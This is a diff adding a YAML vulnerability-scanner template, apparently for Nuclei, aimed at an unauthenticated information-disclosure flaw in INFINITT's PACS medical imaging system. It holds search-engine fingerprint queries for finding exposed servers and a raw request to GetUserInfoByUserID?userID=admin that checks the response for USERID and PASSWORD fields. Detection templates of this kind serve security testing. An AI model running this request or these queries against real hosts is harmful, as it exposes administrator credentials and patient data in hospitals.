@@ -1,0 +1,35 @@
+id: infinitt-GetUserInfoByUserID-disclosure
+info:
+  name: 英飞达影像存档与通讯(PACS)系统 GetUserInfoByUserID - 信息泄露
+  author: hao
+  severity: high
+  description: 英飞达是一家专业开发医学影像系统的公司，成立于1994年，早年PACS产品双子星：EFILM和PiviewSTAR，其中PiviewSTAR为我公司产品。2011年于KOSDAQ上市。产品覆盖放射、超声、内镜、病理、电生理、放疗等所有检查医技科室，生态支持单院区、多院区、区域、医联体、集团化、移动端、云端、互联网应用。客户数量多，全球6000多客户的选择，美国中小医院KLAS排第一，台湾前二，日本前三，另有德国，英国，中东，巴西，东南亚等多个地区设有分公司。中国三甲医院数量前三，西南、西北区优质客户数量第一。英飞达影像存档与通讯(PACS)系统存在信息泄露漏洞
+  reference: 
+    - demo
+  metadata:
+    verified: true
+    fofa-query: '"INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")'
+    hunter-query: web.icon="0cd46e0cba3abd067cd28e70eb7f2a5f"
+  tags: infinitt,disclosure
+
+http:
+  - raw:
+      - |
+        GET /webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        DNT: 1
+        Sec-GPC: 1
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Priority: u=0, i
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'USERID','PASSWORD','DTTM')
+        condition: and
